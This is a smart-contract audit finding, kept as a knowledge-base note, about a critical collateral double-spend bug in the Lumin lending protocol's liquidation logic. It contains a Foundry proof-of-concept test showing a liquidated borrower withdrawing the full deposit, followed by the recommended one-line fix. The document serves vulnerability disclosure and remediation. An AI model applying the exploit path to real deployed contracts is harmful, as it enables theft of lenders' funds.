---
tags:
  - lang/solidity
  - platform/pashov-audit-group
  - has/github
  - has/poc
  - severity/high
  - sector/lending
protocol: "[[Lumin]]"
auditors:
  - "[[Pashov]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-09-01-Lumin.md"
genome:
  - "[[liquidation-logic]]"
  - "[[direct-drain]]"
  - "[[liquidation-underwater]]"
  - "[[timestamp-dependence]]"
  - "[[commitment-uniqueness]]"
---
# [C-01] Collateral double-spend post liquidation is possible

- id: 27233
- impact: HIGH
- protocol: [[Lumin]]
- reporter: Pashov (Pashov Audit Group)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-09-01-Lumin.md

## Summary


This bug report describes a vulnerability in the `AssetManager::assetTransferOnLoanAction` code. The vulnerability allows a borrower to double-spend their collateral, meaning they can withdraw more than the amount of collateral they have. The likelihood of this vulnerability occurring is high, as liquidations never subtract the collateral amount. 

The bug report includes a proof of concept unit test that demonstrates the vulnerability. The test shows that Bob is able to withdraw his whole deposit, even though part of it was used as collateral and was liquidated.

The bug report recommends a code change to the `assetTransferOnLoanAction` code in order to fix the vulnerability. The recommended change is to subtract the transferred amount from both `userDepositFrom.lockedAmount` and `userDepositFrom.depositAmount`. 

This bug report is of high impact, as it could result in borrowers double-spending their collateral, so it is important that the recommended code change is implemented.

## Details

**Severity**

**Impact:**
High, as a borrower can double-spend his collateral

**Likelihood:**
High, as liquidations never subtract the collateral amount

**Description**

In `AssetManager::assetTransferOnLoanAction` in the `if (action == AssetActionType.Seize)` statement, the transferred amount is only subtracted from `userDepositFrom.lockedAmount`, but it should have also been subtracted from `userDepositFrom.depositAmount` as well. This means that a borrower's collateral balance won't be decreased on liquidation, even though the loan shareholders will receive most of the collateral.

Here is an executable Proof of Concept unit test that demonstrates the vulnerability (you can add this in the end of your `LoanManager.Repay` test file):

```solidity
function test_LiquidateExploit() public {
    // because of the `setUp` method, at this point Bob has taken a loan from Alice through Lumin
    uint256 bobDeposit = wrappedAssetManager.depositOf(assetId[1], bob).depositAmount;

    // make loan expire
    vm.warp(block.timestamp + 300 days + 1);
    // random user liquidates Bob's loan, so collateral (asset[1]) should be transferred to the lender
    vm.prank(0x1111111111111111111111111111111111111111);
    wrappedLoanManagerDelegator.liquidate(1);

    // Bob can withdraw his whole deposit even though part of it was used as collateral and was liquidated
    uint256 bobCollateralWalletBalance = mockERC20Token[1].balanceOf(bob);
    vm.prank(bob);
    wrappedAssetManager.assetDepositWithdraw(assetId[1], IAssetManager.AssetActionType.Withdraw, bobDeposit);

    assertEq(mockERC20Token[1].balanceOf(bob) - bobCollateralWalletBalance, bobDeposit);
}
```

**Recommendations**

Change the code in `assetTransferOnLoanAction` in the following way:

```diff
else if (action == AssetActionType.Seize) {
        userDepositFrom.lockedAmount -= amount;
+       userDepositFrom.depositAmount -= amount;
        userDepositTo.depositAmount += amount;
    }
```
